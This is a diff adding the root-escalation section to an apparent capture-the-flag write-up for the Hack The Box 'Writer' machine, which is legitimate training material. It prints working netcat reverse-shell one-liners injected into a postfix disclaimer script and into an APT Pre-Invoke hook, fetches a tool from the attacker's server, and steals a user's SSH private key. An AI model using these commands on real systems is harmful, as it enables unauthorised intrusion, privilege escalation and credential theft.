@@ -335,7 +335,283 @@ That's it for the user flag! Now it's time to get...
 
 ## Root Access
 
-The constant server issues on hack the box really make it not worth getting the root flag.  Due to constant disconnections it took me nearly 7 hours just go get the user flag.  Hacking is fun but hack the box is a terrible service.
+First let's explore kyle's access, our running processes and netstats.
+
+```
+kyle@writer:~$ ls -al
+total 28
+drwxr-xr-x 3 kyle kyle 4096 Aug  5 09:59 .
+drwxr-xr-x 4 root root 4096 Jul  9 10:59 ..
+lrwxrwxrwx 1 root root    9 May 18  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 kyle kyle  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 kyle kyle 3771 Feb 25  2020 .bashrc
+drwx------ 2 kyle kyle 4096 Jul 28 09:03 .cache
+-rw-r--r-- 1 kyle kyle  807 Feb 25  2020 .profile
+-r-------- 1 kyle kyle   33 Dec  3 00:55 user.txt
+```
+
+```
+kyle@writer:~$ id
+uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
+```
+
+```
+kyle@writer:~$ netstat -punta | grep LISTEN
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::445                  :::*                    LISTEN      -                   
+tcp6       0      0 :::139                  :::*                    LISTEN      -   
+```
+
+Our enumeration reveals an SMTP protocol on port 25 `tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -` which could give us a window 
+to some juicy exploits` 
+For our final inspection we'll use PsPy64 to monitor linux processes without root permissions. But we have to get it onto the victims machine.  So let's clone it, start a python server, and 
+see if we can use `wget` to retreive it from our machine.
+
+On our Machine:
+
+```
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
+python -m SimpleHTTPServer
+```
+
+On victim:
+
+```
+kyle@writer:~$ wget http://10.10.14.20:8000/pspy64
+--2021-12-03 15:21:41--  http://10.10.14.20:8000/pspy64
+Connecting to 10.10.14.20:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3078592 (2.9M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64                 100%[=========================>]   2.94M   848KB/s    in 3.9s    
+
+2021-12-03 15:21:45 (775 KB/s) - ‘pspy64’ saved [3078592/3078592]
+```
+
+Next make pspy64 executable and well.... execute it
+
+```
+chmod +x pspy64
+./pspy64
+```
+
+pspy reveals a disclaimer file that is to be sent from sender to receiver.  Sender being our current user.
+> 2021/12/03 16:04:01 CMD: UID=0    PID=39174  | /usr/bin/cp /root/.scripts/disclaimer /etc/postfix/disclaimer
+looks juicy, let's find and check it out.
+
+```
+$ find / -type f -group filter 2>/dev/null
+/etc/postfix/disclaimer
+nano /etc/postfix/disclaimer
+```
+
+The good news is this particular process is extremely exploitable.  That bad news is there's a cron job that is set to clear the script to the default state before running the code.  So let's hijack this process with a different script.
+
+On our machine:
+
+```
+rlwrap nc -lvnp 8000
+```
+
+In the victims machine create a python mail script:
+
+```
+nano mail.py
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import smtplib
+import sys
+
+lhost = "10.10.14.20"
+lport = 8000
+rhost = "10.10.11.101"
+rport = 2255 # 489,587
+
+# create message object instance
+msg = MIMEMultipart()
+
+
+# setup the parameters of the message
+password = "" 
+msg['From'] = "kyle@write.htb"
+msg['To'] = "john@write.htb"
+msg['Subject'] = "This is not a drill!"
+
+# payload 
+message = ('asdasdasd')
+
+print("[*] Payload is generated : %s" % message)
+
+msg.attach(MIMEText(message, 'plain'))
+server = smtplib.SMTP(host=rhost,port=rport)
+
+if server.noop()[0] != 250:
+    print("[-]Connection Error")
+    exit()
+
+server.starttls()
+
+# Uncomment if log-in with authencation
+# server.login(msg['From'], password)
+
+server.sendmail(msg['From'], msg['To'], msg.as_string())
+server.quit()
+
+print("[***]successfully sent email to %s:" % (msg['To']))
+```
+
+Now comes the neat part, let's hijack the disclaimer:
+
+```
+nano /etc/postfix/disclaimer
+```
+
+add this line to the top of the disclaimer:
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR IP> <PORT> >/tmp/f
+```
+
+now run your python script
+
+```
+python3 mail.py
+```
+
+and BAM! thanks john!
+
+```
+┌──(taylor㉿DESKTOP-72GCBB0)-[~/Documents/Writer]
+└─$ rlwrap nc -lvnp 8000
+Listening on 0.0.0.0 8000
+Connection received on 10.10.11.101 51696
+/bin/sh: 0: can't access tty; job control turned off
+whoami
+john
+id
+uid=1001(john) gid=1001(john) groups=1001(john)
+```
+
+Now let's nab some ssh keys and get a proper shell
+
+```
+cd /home/john/.ssh/
+cat id_rsa
+```
+
+Don't be a newb, copy and paste the entire rsa key.  Dashes and everything. Then on our machine:
+
+```
+nano id_rsa
+chmod 600 id_rsa
+```
+
+and copy and paste the entire key then >cntrl+x >y >enter. Now we should be able to simply ssh back into the victim.
+
+```
+┌──(taylor㉿DESKTOP-72GCBB0)-[~/Documents/Writer]
+└─$ sudo ssh -i id_rsa john@10.10.11.101 -p 22
+The authenticity of host '10.10.11.101 (10.10.11.101)' can't be established.
+ED25519 key fingerprint is SHA256:EcmD06Im3Ox+/6cWwJX2eaLFPlgm/TO0Jw20KJK1XSw.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:11: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.101' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri  3 Dec 16:34:10 UTC 2021
+
+  System load:  0.21              Processes:             256
+  Usage of /:   64.9% of 6.82GB   Users logged in:       0
+  Memory usage: 26%               IPv4 address for eth0: 10.10.11.101
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Jul 28 09:19:58 2021 from 10.10.14.19
+john@writer:~$ id
+uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
+```
+
+let's run pspy again as john to get a handle on what's going on.  
+
+Our machine:
+
+```
+python3 -m http.server
+```
+
+Victim:
+
+```
+wget 10.10.14.20:8000/pspy64
+chmod +x pspy64
+./pspy64
+```
+
+pspy reveals this process using apt
+
+> 2021/12/03 16:38:01 CMD: UID=0    PID=40804  | /usr/bin/apt-get update 
+
+We can exploit this process to finally get root! Let's start another netcat listener on our machine:
+
+```
+rlwrap nc -lvnp 1234
+```
+
+```
+echo 'APT::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR IP> <PORT> >/tmp/f"};' > /etc/apt/apt.conf.d/shell
+```
+
+and........................................
+
+```
+┌──(taylor㉿DESKTOP-72GCBB0)-[~/Documents/Writer]
+└─$ rlwrap nc -lvnp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.11.101 59084
+/bin/sh: 0: can't access tty; job control turned off
+whoami
+root
+```
+
+Oh lawwwwwwwwwd.... that was a long one guys
+
+# Congrats! Root Flag Captured!
+
+
+
+
+
+
+
+
+
+
+
 
 
 
